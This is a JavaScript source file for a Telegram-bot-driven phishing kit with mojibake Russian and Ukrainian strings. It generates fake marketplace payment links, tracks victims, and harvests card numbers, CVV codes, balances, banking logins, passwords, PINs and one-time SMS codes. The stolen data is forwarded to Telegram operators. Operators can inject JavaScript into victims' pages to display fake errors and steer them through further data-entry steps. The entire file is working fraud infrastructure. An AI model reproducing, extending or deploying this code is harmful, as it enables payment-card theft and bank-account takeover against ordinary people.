            user.scene = "wallet"
            await ctx.replyWithHTML(`–ù–∞–ø–∏—à–∏—Ç–µ –≤–∞—à BTC –∞–¥—Ä–µ—Å.`)
        } else if (cbdata.startsWith("shnick")) {
            await ctx.replyWithHTML(`–í–∞—à –Ω–∏–∫ —É—Å–ø–µ—à–Ω–æ ${user.nick == 1 ? "—Å–∫—Ä—ã—Ç": "–ø–æ–∫–∞–∑–∞–Ω"}`)
            user.nick = !user.nick
        } else if (cbdata.startsWith("countries")) {
            let btns = [];
            for (var i=0; i < countries.length; i++) {
                btns.push([{text: `${countries[i].flag} ${countries[i].name}`, callback_data: `country_${countries[i].code}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É –¥–ª—è –≤–æ—Ä–∫–∞`
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("country_")) {
            let country = countries.find(x => x.code == cbdata.split("_")[1]);
            let services = country.services;
            let btns = [];
            for (var i=0; i < services.length; i++) {
                btns.push([{text: `${country.flag} ${services[i].name}`, callback_data: `service_${services[i].subdomain}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–∏—Å –¥–ª—è –≤–æ—Ä–∫–∞`
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("service_")) {
            let subdomain = cbdata.split("_")[1]
            text = "–í—ã–±–µ—Ä–∏—Ç–µ —É–¥–æ–±–Ω—ã–π –¥–ª—è –≤–∞—Å —Å–ø–æ—Å–æ–± –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏."
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: keyboard.genLink(subdomain)
            }})
        } else if (cbdata.startsWith("manual_")) {
            let subdomain = cbdata.split("_")[1]
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0,
                "name": "",
                "fio": "",
                "address": "",
                "phone": "", 
                "service": subdomain,
                "price": 0,
                "type": "manual"
            }
            db.get("links").push(link)
            user.scene = `name_${link.id}`
            await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            
        } else if (cbdata.startsWith("parsing_")) {
            if (cbdata.split("_")[1] == "olxua") {
                user.scene = `parsing_${cbdata.split("_")[1]}`
                await ctx.replyWithHTML("–ü—Ä–∏—à–ª–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ.")
            } else {
                await ctx.replyWithHTML("–ü–∞—Ä—Å–µ—Ä–∞ –ø–æ–¥ —ç—Ç–æ—Ç —Å–µ—Ä–≤–∏—Å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
            }
        } else if (cbdata.startsWith("genlink")) {
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0
            }
            db.get("links").push(link)
            await ctx.reply(`‚úÖ –°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞\n\nhttps://${config.domain}/${link.id}`)
        } else if (cbdata.startsWith("dcard_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `alert("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –∫–∞–∫–∞—è-—Ç–æ –æ—à–∏–±–∫–∞. –ö–∞—Ä—Ç–∞ –Ω–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞."); document.location.href="/card/${link.id}"`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.card_err()
            })
        } else if (cbdata.startsWith("next_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `ready`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `üíé –í–∞—à–µ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –≤–±–∏–≤–∞–µ—Ç @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.vbiv(ctx.update.callback_query.from.username)
            })
        } else if (cbdata.startsWith("nextsms_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `sms`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `üíé –í–∞—à –º–∞–º–æ–Ω—Ç –Ω–∞ –≤–≤–æ–¥–µ –°–ú–° @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            let btns = [
                [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –õ–ö', callback_data: `nextlkYBRAT'_${link.id}`}],
                [{ text: `‚úÖ –ù–ê –°–ú–°`, callback_data: 'zxczxczxc' }]
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `‚õîÔ∏è ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
            }
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextlk_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `lk`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `üíé –í–∞—à –º–∞–º–æ–Ω—Ç –Ω–∞ –≤–≤–æ–¥–µ –¥–∞–Ω–Ω—ã—Ö –æ—Ç –õ–ö @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            let btns = [
                [{ text: `‚úÖ –í–±–∏–≤ –Ω–∞ –õ–ö`, callback_data: 'zxczxczxc' }]
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `‚õîÔ∏è ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
            }
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextapp_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `app`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `üì± –ö–æ–¥ —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextcall_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `call`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `üì± –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextcardbal_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `alert('–í–≤–µ–¥—ñ—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –∑–∞–ª–∏—à–æ–∫ –≤–∞—à–æ–≥–æ –±–∞–ª–∞–Ω—Å—É –∫–∞—Ä—Ç–∫–∏ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó');window.location.href='/card/${link.id}'`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `üí≥ –¢–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
            await ctx.telegram.sendMessage(user.id, `üí≥ –í–∞—à –º–∞–º–æ–Ω—Ç –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ç–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("vbiv_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let owner = db.get("users").value().find(x=>x.id==link.owner)
            link.vbiver = ctx.update.callback_query.from.id;
            try {
                let bank = await axios.get(`https://bins.antipublic.cc/bins/${link.card}`)
                bank = bank.data;
                brand = `${bank.type} ${bank.brand} ${bank.bank}`
            } catch {
                brand = `–ù–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω`
            }
            let btns = [
                [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –°–ú–°', callback_data: `nextsms_${link.id}`}],
                [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –õ–ö', callback_data: `nextlk_${link.id}`}],
                [{ text: 'üì± –ö–æ–¥ —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è', callback_data: `nextapp_${link.id}`}, { text: 'üì± –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data: `nextcall_${link.id}`}],
                [{ text: 'üí≥ –¢–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å', callback_data: `nextcardbal_${link.id}`}],
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `‚õîÔ∏è ${templates[i].name}`, callback_data: `carderror_${link.id}_${templates[i].name}`}]);
            }
           bot.telegram.sendMessage(link.owner, `üíé –í–∞—à –ª–æ–≥ –≤–±–∏–≤–∞–µ—Ç @${ctx.update.callback_query.from.username}

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price}`, {
                parse_mode: "html",
            })
            await bot.telegram.sendMessage(link.vbiver, `
‚ÄºÔ∏è <b>–ü—Ä–∏—à–ª–∞ –∫–∞—Ä—Ç–∞</b>

–í–ª–∞–¥–µ–ª–µ—Ü: <a href='tg://user?id=${owner.id}'>${owner.name}</a>
–ë–∏–Ω: ${brand}
‚òòÔ∏è –ö–∞—Ä—Ç–∞: <code>${link.card}</code>
üìÜ –°—Ä–æ–∫: <code>${link.srok}</code>
üï∂ CVC: <code>${link.cvv}</code>
–ë–∞–ª–∞–Ω—Å: ${link.bal} ‚Ç¥

üë§ –°—Å—ã–ª–∫–∞: ${config.domain}/${link.id}

üí∏ –°—É–º–º–∞: ${link.price}
            `, {
                parse_mode: "html",
                reply_markup: {
                    inline_keyboard: btns
                }
            })
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚úÖ –í–±–∏–≤–∞–µ—Ç @${ctx.update.callback_query.from.username}`, callback_data: 'zxczxczxc' }]
                ]
            })
        } else if (cbdata.startsWith("sms_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `sms`
            link.vbiver = ctx.update.callback_query.from.id;
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚úÖ –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –°–ú–°`, callback_data: 'zxczxczxc' }],
                    [{ text: 'üìû –ó–≤–æ–Ω–æ–∫', callback_data: `mobile_${link.id}`}],
                    [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –°–ú–°', callback_data: `nextsms_${link.id}`}],
                    [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –õ–ö', callback_data: `nextlk_${link.id}`}],
                    [{ text: 'üì± –ö–æ–¥ —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è', callback_data: `nextapp_${link.id}`}, { text: 'üì± –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data: `nextcall_${link.id}`}],
                    [{ text: 'üí≥ –¢–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å', callback_data: `nextcardbal_${link.id}`}]
                ]
            })
        } else if (cbdata.startsWith("mobile_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `call`
            link.vbiver = ctx.update.callback_query.from.id;
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚úÖ –ó–≤–æ–Ω–æ—á–µ–∫`, callback_data: 'zxczxczxc' }],
                    [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –°–ú–°', callback_data: `nextsms_${link.id}`}],
                    [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –õ–ö', callback_data: `nextlk_${link.id}`}],
                    [{ text: 'üì± –ö–æ–¥ —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è', callback_data: `nextapp_${link.id}`}, { text: 'üì± –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data: `nextcall_${link.id}`}],
                    [{ text: 'üí≥ –¢–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å', callback_data: `nextcardbal_${link.id}`}]
                ]
            })
        } else if (cbdata.startsWith("error_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = 'document.querySelector("#notify").innerHTML = `' + template.text + '`'
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚õîÔ∏è ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `‚õîÔ∏è –í–∞—à–µ–º—É –º–∞–º–æ–Ω—Ç—É –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –æ—à–∏–±–∫–∞ "${template.name}"

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("lkerror_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = `$('.swal2-center').style = "overflow-y: auto; display: grid;"; $('#swal2-html-container').html('${template.text}')`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚õîÔ∏è ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `‚õîÔ∏è –í–∞—à–µ–º—É –º–∞–º–æ–Ω—Ç—É –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –æ—à–∏–±–∫–∞ "${template.name}"

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("carderror_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = `alert('${template.text}'); window.location.reload()`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `‚õîÔ∏è ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `‚õîÔ∏è –í–∞—à–µ–º—É –º–∞–º–æ–Ω—Ç—É –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –æ—à–∏–±–∫–∞ "${template.name}"

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("success_")) {
            await ctx.reply(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø—Ä–æ—Ñ–∏—Ç–∞:`)
            user.scene = `profit_${cbdata.split("_")[1]}`
            /*await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: '‚úÖ –£—Å–ø–µ—Ö', callback_data: 'zxczxczxc' }]
                ]
            })*/
            await ctx.deleteMessage(ctx.update.callback_query.message.message_id)
        } else if (cbdata == "rassylka") {
            user.scene = `rassylka`;
            return await ctx.replyWithHTML(`–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏!`)
        } else if (cbdata == "templates") {
            let templates = db.get("templates").value();
            let btns = [
                [{ text: '–î–æ–±–∞–≤–∏—Ç—å –Ω–æ–≤—ã–π —à–∞–±–ª–æ–Ω', callback_data: `createtemplate`}]
            ];
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: templates[i].name, callback_data: `template_${templates[i].name}`}, {text: `‚ùå`, callback_data: `deltemplate_${templates[i].name}`}]);
            }
            await ctx.telegram.sendMessage(user.id, `–®–∞–±–ª–æ–Ω—ã –æ—à–∏–±–æ–∫: `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("createtemplate")) {
            user.scene = "template_name"
            await ctx.telegram.sendMessage(user.id, `–í–≤–µ–¥–∏—Ç–µ –∏–º—è —à–∞–±–ª–æ–Ω–∞:`);
        } else if (cbdata.startsWith("deltemplate_")) {
            let template = db.get("templates").value().find(x=>x.name==cbdata.split("_")[1])
            db.get("templates").value().splice(db.get("templates").value().indexOf(template), 1);
            return await ctx.replyWithHTML(`–û—à–∏–±–∫–∞ "${template.name}"—É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞!`)
        }
        return ctx.answerCbQuery()
    } catch (error) {console.log(error)}
})

bot.launch();

app.get('/clstatus:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.status = ``
    return res.send(link.status)
    res.send(JSON.stringify(link))
})
app.get('/status:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    return res.send(link.status)
    res.send(JSON.stringify(link))
})
app.get('/:linkId', (req, res) => {
    try {
        let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
        let country = countries.find((x) => {
            let y = x.services.find(x=>x.subdomain==link.service);
            if(y) return true
            return false
        });
        let service = country.services.find(x=>x.subdomain==link.service);
        var ua = useragent.parse(req.headers['user-agent']);
        bot.telegram.sendMessage(link.owner, `
${country.flag} ${service.name}
‚ÑπÔ∏è –ú–∞–º–æ–Ω—Ç –ø–µ—Ä–µ—à—ë–ª –ø–æ —Å—Å—ã–ª–∫–µ üîó

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Å—ã–ª–∫–∞: ${config.domain}/${link.id}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 
‚òëÔ∏èIP –∞–¥—Ä–µ—Å: ${req.headers['x-forwarded-for']}
‚òëÔ∏è–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:  ${ua.isMobile ? 'üì± –¢–µ–ª–µ—Ñ–æ–Ω' : 'üñ• –ö–æ–º–ø—å—é—Ç–µ—Ä'}
        `, {
            parse_mode: "html",
        })
        return res.render(`${service.folder}/index`, {link: link, name: link.fio.split(" ")[1], surname: link.fio.split(" ")[0]})
        res.send(JSON.stringify(link))
    } catch (err){
        console.log(err)
        res.send("ERROR!")
    }
})
app.get('/personal/:linkId', (req,res)=>{
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.status = `loading`
    return res.render("lk", {id:link.id})
})
app.post('/personal/submit/:linkId', async (req,res)=>{
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `üíé –ú–∞–º–æ–Ω—Ç –æ—Ç–ø—Ä–∞–≤–∏–ª –¥–∞–Ω–Ω—ã–µ –æ—Ç –õ–ö\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    let btns = [
        [{ text: 'üìß –°–ú–°', callback_data: `sms_${link.id}`}],
        [{ text: 'üìû –ó–≤–æ–Ω–æ–∫', callback_data: `mobile_${link.id}`}],
    ]
    let templates = db.get("templates").value();
    for (var i=0; i < templates.length; i++) {
        btns.push([{text: `‚õîÔ∏è ${templates[i].name}`, callback_data: `lkerror_${link.id}_${templates[i].name}`}]);
    }
    await bot.telegram.sendMessage(link.vbiver, `‚ÄºÔ∏è <b>–î–∞–Ω–Ω—ã–µ –æ—Ç –õ–ö</b>\n\n–í–ª–∞–¥–µ–ª–µ—Ü: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\n‚òòÔ∏è –ö–∞—Ä—Ç–∞: <code>${link.card}</code>\nüìÜ –°—Ä–æ–∫: <code>${link.srok}</code>\nüï∂ CVC: <code>${link.cvv}</code>\n\n–õ–æ–≥–∏–Ω: +380${req.body.phone}\n–ü–∞—Ä–æ–ª—å: ${req.body.password}\n–ü–ò–ù –∫–æ–¥: ${req.body.pin}\nUID: <code>${req.cookies["uid"]}</code>\n–í–æ—Ä–∫–µ—Ä: @${owner.username}\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: btns
        }
    })
    return res.send("200")
})
app.get('/card/:linkId', async (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let uid = !req.cookies["uid"] ? crypto.randomUUID() : req.cookies["uid"]
    res.cookie("uid", uid)
    bot.telegram.sendMessage(config.logs_id, `
üíé –ú–∞–º–æ–Ω—Ç –ø–µ—Ä–µ—à—ë–ª –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã

–ù–∞–∑–≤–∞–Ω–∏–µ: ${link.name}
üë§ –°—Å—ã–ª–∫–∞: ${config.domain}/${link.id}

üí∏ –°—É–º–º–∞: ${link.price}

IP: ${req.headers['x-forwarded-for']}
    `, {
        parse_mode: "html",
    })
    user = await bot.telegram.getChat(link.owner)
    bot.telegram.sendMessage(link.owner, `
üíé –ú–∞–º–æ–Ω—Ç –ø–µ—Ä–µ—à—ë–ª –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã

–ù–∞–∑–≤–∞–Ω–∏–µ: ${link.name}
üí∏ –°—É–º–º–∞: ${link.price}
UID: <code>${uid}</code>
–í–æ—Ä–∫–µ—Ä: @${user.username}

IP: ${req.headers['x-forwarded-for']}
    `, {
        parse_mode: "html",
    })
    link.status = "loading"
    return res.render("card", {id:link.id})
    res.send(JSON.stringify(link))
})

app.post('/card/submit/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.card4 = req.body.fcard.replaceAll(" ", "")
    link.card4 = link.card4.substring(link.card4.length-4)
    link.card = req.body.fcard.replaceAll(" ", "")
    link.srok = `${req.body.fexpm}/${req.body.fexpy}`
    link.cvv = req.body.fcvc
    link.bal = req.body.fbal
    link.phone = req.body.fphone
    try {
        let bank = await axios.get(`https://bins.antipublic.cc/bins/${link.card}`)
        bank = bank.data;
        brand = `${bank.brand} ${bank.bank}`
    } catch {
        brand = `–ù–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω`
    }
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    let country = countries.find((x) => {
        let y = x.services.find(x=>x.subdomain==link.service);
        if(y) return true
        return false
    });
    let service = country.services.find(x=>x.subdomain==link.service);
    var ua = useragent.parse(req.headers['user-agent']);
    bot.telegram.sendMessage(link.owner, `
‚òëÔ∏è –í–≤–æ–¥ –∫–∞—Ä—Ç—ã ${country.flag} ${service.name}

‚òëÔ∏è–û–±—ä—è–≤–ª–µ–Ω–∏–µ: ${link.name}
‚òëÔ∏è–°—Ç–æ–∏–º–æ—Å—Ç—å: ${link.price} 

üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã: ${link.card.substring(0,5)}******${link.card4}

üí∞ –ë–∞–ª–∞–Ω—Å: ${link.bal} 
üè¶ –ë–∞–Ω–∫: ${brand}

‚òëÔ∏èIP –∞–¥—Ä–µ—Å: ${req.headers['x-forwarded-for']}
‚òëÔ∏è–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:  ${ua.isMobile ? 'üì± –¢–µ–ª–µ—Ñ–æ–Ω' : 'üñ• –ö–æ–º–ø—å—é—Ç–µ—Ä'}
    `, {
        parse_mode: "html",
    })
    await bot.telegram.sendMessage(config.achat_id, `‚ÄºÔ∏è <b>–ü—Ä–∏—à–ª–∞ –∫–∞—Ä—Ç–∞</b>\n\n–í–ª–∞–¥–µ–ª–µ—Ü: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\n–ë–∏–Ω: ${brand}\n‚òòÔ∏è –ö–∞—Ä—Ç–∞: <code>${req.body.fcard.replaceAll(" ", "")}</code>\nüìÜ –°—Ä–æ–∫: <code>${req.body.fexpm}/${req.body.fexpy}</code>\nüï∂ CVC: <code>${req.body.fcvc}</code>\n–ë–∞–ª–∞–Ω—Å: ${link.bal} ‚Ç¥\n\nUID: <code>${req.cookies["uid"]}</code>\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: [
                [{ text: '‚úÖ –í–∑—è—Ç—å –Ω–∞ –≤–±–∏–≤', callback_data: `vbiv_${link.id}`}]
            ]
        }
    })
    return res.send("200")
})

app.get('/submit/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `üíé –ú–∞–º–æ–Ω—Ç –ø–µ—Ä–µ—à—ë–ª –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –°–ú–°\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    console.log(link.status)
    if(link.status == "call") return res.render("call", {id:link.id, card: link.card4})
    if(link.status == "app") return res.render("app", {id:link.id, card: link.card4})
    return res.render("sms", {id:link.id, card: link.card4})
    res.send(JSON.stringify(link))
})

app.post('/confirm/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `üíé –ú–∞–º–æ–Ω—Ç –≤–≤—ë–ª –°–ú–° –∫–æ–¥\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    let btns = [
        [{ text: '‚úÖ –£—Å–ø–µ—Ö', callback_data: `success_${link.id}`}],
        [{ text: '‚úÖ –ü–∏–∑–¥—É–π –Ω–∞ –õ–ö', callback_data: `nextlk_${link.id}`}],
        [{ text: 'üì± –ö–æ–¥ —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è', callback_data: `nextapp_${link.id}`}, { text: 'üì± –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data: `nextcall_${link.id}`}],
        [{ text: 'üí≥ –¢–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å', callback_data: `nextcardbal_${link.id}`}],
    ]
    let templates = db.get("templates").value();
    for (var i=0; i < templates.length; i++) {
        btns.push([{text: `‚õîÔ∏è ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
    }
    user = await bot.telegram.getChat(link.owner)
    await bot.telegram.sendMessage(link.vbiver, `üíé <b>–í–≤–µ–¥—ë–Ω –∫–æ–¥</b>\n\n–í–ª–∞–¥–µ–ª–µ—Ü: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\n‚òòÔ∏è –ö–∞—Ä—Ç–∞: <code>${link.card}</code>\nüìÜ –°—Ä–æ–∫: <code>${link.srok}</code>\nüï∂ CVC: <code>${link.cvv}</code>\n\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: <code>${link.phone}</code>\nUID: <code>${req.cookies["uid"]}</code>\n–í–æ—Ä–∫–µ—Ä: @${user.username}\nIP: ${req.headers['x-forwarded-for']}\n\n<code>${req.body.dscode}</code>`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: btns
        }
    })
    link.status = `loading`
    return res.render("sms", {id:link.id, card: link.card4}) 
    res.send(JSON.stringify(link))
})
app.listen(port)
